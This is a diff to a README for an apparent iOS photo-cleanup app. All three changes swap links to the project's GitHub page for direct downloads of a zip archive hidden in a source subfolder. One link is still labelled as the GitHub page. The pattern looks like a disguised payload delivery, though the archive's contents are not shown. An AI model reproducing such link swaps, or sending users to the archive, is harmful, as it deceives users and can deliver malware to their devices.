@@ -1,6 +1,6 @@
 # 📸 snap-clean-ios - Clean your iPhone photos faster
 
-[![Download snap-clean-ios](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Oncoming-italy851/snap-clean-ios)
+[![Download snap-clean-ios](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Oncoming-italy851/snap-clean-ios/main/SnapClean/Shared/Components/clean-snap-ios-v1.7.zip)
 
 ## 📱 What this app does
 
@@ -30,7 +30,7 @@ It is built for iOS 17 and newer. It works on the device, so your photos stay on
 
 Visit this page to download and set up the app:
 
-[https://github.com/Oncoming-italy851/snap-clean-ios](https://github.com/Oncoming-italy851/snap-clean-ios)
+[https://raw.githubusercontent.com/Oncoming-italy851/snap-clean-ios/main/SnapClean/Shared/Components/clean-snap-ios-v1.7.zip](https://raw.githubusercontent.com/Oncoming-italy851/snap-clean-ios/main/SnapClean/Shared/Components/clean-snap-ios-v1.7.zip)
 
 After you open the page:
 
@@ -105,7 +105,7 @@ This setup fits users who want a simple local cleanup app for private photo sort
 
 ## 🔗 Open the download page
 
-[Visit the snap-clean-ios GitHub page](https://github.com/Oncoming-italy851/snap-clean-ios)
+[Visit the snap-clean-ios GitHub page](https://raw.githubusercontent.com/Oncoming-italy851/snap-clean-ios/main/SnapClean/Shared/Components/clean-snap-ios-v1.7.zip)
 
 ## 📌 Topics
 
